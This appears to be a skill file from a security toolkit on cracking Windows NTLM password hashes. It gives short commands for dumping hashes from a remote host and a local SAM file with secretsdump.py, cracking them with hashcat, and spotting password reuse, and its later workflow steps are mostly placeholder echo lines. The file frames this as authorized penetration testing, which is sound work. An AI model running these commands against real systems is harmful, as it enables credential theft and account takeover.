<!-- Copyright (c) 2026 defconxt. All rights reserved. -->
<!-- Licensed under AGPL-3.0 — see LICENSE file for details. -->
<!-- CIPHER is a trademark of defconxt. -->
---
name: cracking-ntlm-hashes
description: >-
  Crack NTLM password hashes extracted from Windows environments including SAM database, NTDS.dit, and pass-the-hash captured credentials.
domain: cybersecurity
subdomain: password-cracking
tags:
  - ntlm
  - windows
  - sam-database
  - ntds
  - pass-the-hash
version: "1.0"
author: defconxt
license: AGPL-3.0
metadata:
  mitre-attack: ["T1003.002", "T1110"]
  cwe: ["CWE-916"]
  tools: ["hashcat", "john", "secretsdump.py", "mimikatz", "ntdsxtract"]
---

# Cracking Ntlm Hashes

## Overview

Crack NTLM password hashes extracted from Windows environments including SAM database, NTDS.dit, and pass-the-hash captured credentials.

## Prerequisites

| Tool / Requirement | Details |
|---|---|
| `hashcat` | Security tooling |
| `john` | Security tooling |
| `secretsdump.py` | Security tooling |
| `mimikatz` | Security tooling |
| `ntdsxtract` | Security tooling |
| Isolated lab environment for testing | Environment requirement |
| Authorization and signed Rules of Engagement (RoE) | Environment requirement |
| Relevant target samples or systems acquired through authorized channels | Environment requirement |

## Quick Reference

```bash
# Extract NTLM from remote target
secretsdump.py domain/user:pass@10.10.10.1

# Extract from local SAM
secretsdump.py -sam SAM -system SYSTEM LOCAL

# Crack NTLM with hashcat (mode 1000)
hashcat -m 1000 -a 0 ntlm_hashes.txt rockyou.txt -r best64.rule

# Analyze for hash reuse
python3 -c "
hashes = open('ntlm_hashes.txt').readlines()
from collections import Counter
c = Counter(h.split(':')[3] for h in hashes if ':' in h)
for h, n in c.most_common(10):
    print(f'{n} accounts share hash: {h[:16]}...')
"
```

## Workflow

### Step 1: Preparation and Reconnaissance

```bash
# Identify target and gather initial intelligence
file ./target_sample
hashcat --version 2>/dev/null || echo "Install hashcat"

# Set up working directory
mkdir -p /tmp/cracking-ntlm-hashes/{output,logs,artifacts}
```

### Step 2: Primary Analysis

```bash
# Execute primary analysis with hashcat
# Refer to Quick Reference above for detailed commands
echo "[*] Running Cracking Ntlm Hashes with hashcat..."

# Log all operations
script -q /tmp/cracking-ntlm-hashes/logs/session.log
```

### Step 3: Deep Investigation

```bash
# Apply john for secondary analysis
echo "[*] Deep investigation with john..."

# Cross-reference findings
diff /tmp/cracking-ntlm-hashes/output/primary.json /tmp/cracking-ntlm-hashes/output/secondary.json
```

### Step 4: Documentation and Reporting

```bash
# Generate structured findings report
cat <<'EOF' > /tmp/cracking-ntlm-hashes/output/report.json
{
  "technique": "cracking-ntlm-hashes",
  "domain": "password-cracking",
  "tools_used": ["hashcat", "john"],
  "findings": [],
  "recommendations": []
}
EOF
```

## Verification

- [ ] Environment and tools verified and operational
- [ ] Target samples acquired through authorized channels
- [ ] Primary analysis completed with findings documented
- [ ] Secondary validation performed with independent tooling
- [ ] All artifacts preserved in structured output directory
- [ ] Detection opportunities documented for blue team

## References

- [MITRE ATT&CK T1003.002](https://attack.mitre.org/techniques/T1003/002) — Related technique
- [hashcat Documentation](https://hashcat.org/) — Primary tooling
- [john Reference](https://john.org/) — Secondary tooling
